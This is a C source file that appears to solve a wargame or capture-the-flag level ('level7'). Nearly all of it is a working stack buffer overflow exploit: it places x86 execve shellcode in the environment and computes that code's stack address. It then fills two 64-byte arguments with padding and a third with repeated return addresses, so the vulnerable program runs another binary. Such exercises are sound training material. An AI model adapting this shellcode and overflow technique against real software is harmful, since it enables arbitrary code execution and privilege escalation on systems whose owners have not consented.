#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define VULN "../../var/challenge/level7/7"

/* The shellcode for executing the '/usr/local/bin/l33t' command */
char shellcode[] = "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t";

int main() {
	/* Obtain the shellcode  address */
	unsigned int addr = 0xc0000000 - 8 - strlen(VULN) - 1 - strlen(shellcode) - 1;
	printf("Using address: %#010x\n", addr);
    /* Using address: 0xbfffffab (\xAB\xFF\xFF\xBF) */	

	/* Define the comandline parameters that VULN expects */
    /* Fill cmdParam1 and cmdParam2 to the exact brim of their buffer size of 64 characters */
	char *cmdParam1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	char *cmdParam2 = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
    /*
        Each snippet in cmdParam3 is designed so that, if the memory alignment is correct,
        one of these addresses will seamlessly replace the return address, eliminating the need to worry
        about the specific replacement.
    */
	char *cmdParam3 = "\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF\xAB\xFF\xFF\xBF";

	/* Define a null-terminated ARGV array for execve() */
	char *progWithParameters[] = {VULN, cmdParam1, cmdParam2, cmdParam3, NULL};
	
	/* Define a null-terminated ENVP (environment) array for execve() */
	/* This is where the shellcode is placed on the environment */
	char *envp[] = {shellcode, NULL};
	
	/* Invoke execve(prog, progWithParameters, envp) */
	if (execve(progWithParameters[0], progWithParameters, envp) == -1) {
		perror("execve");
        	exit(EXIT_FAILURE);
	}

	/* The code after execve will not be reached if execve is successful */
	return 0;
}